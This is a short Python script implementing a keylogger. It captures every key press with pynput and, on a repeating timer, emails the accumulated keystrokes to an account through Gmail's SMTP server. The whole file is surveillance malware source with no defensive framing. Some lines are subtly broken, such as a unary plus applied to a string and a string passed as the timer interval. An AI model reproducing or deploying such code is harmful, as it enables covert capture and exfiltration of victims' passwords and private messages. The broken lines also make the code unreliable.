#!/usr/bin/env python

import pynput.keyboard , threading, smtplib




class Keylogger:
	def __init__(self,interval,email,passwd):
		self.log = "Keylogger Started"
		self.timeout = interval
		self.email = email
		self.passwd = passwd

	def append_the_log(self,string):
		self.log = self.log + string

	def process_key_press(self, key):
		
		try:
			current_key = str(key)
			
		except Exception:
			if key == key.space:
				current_key = "  "
			else:
				current_key = +" "+ str(key) + " "
		self.append_the_log(current_key)
		
	def report(self):
		# print(self.log)
		self.send_mail(self.email,self.passwd,"\n\n" +self.log)
		self.log = ""  
		timer = threading.Timer(self.timeout,self.report) 
		timer.start()

	def send_mail(self,email,passwd,message):
		server = smtplib.SMTP("smtp.gmail.com",587)
		server.ehlo()
		server.starttls() 
		server.login(email,passwd)  
		server.sendmail(email, email,message)  
		server.quit()

	def listener_start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report() 
			keyboard_listener.join()


myPC = Keylogger("time_interval","youremail@address","password")
myPC.listener_start()
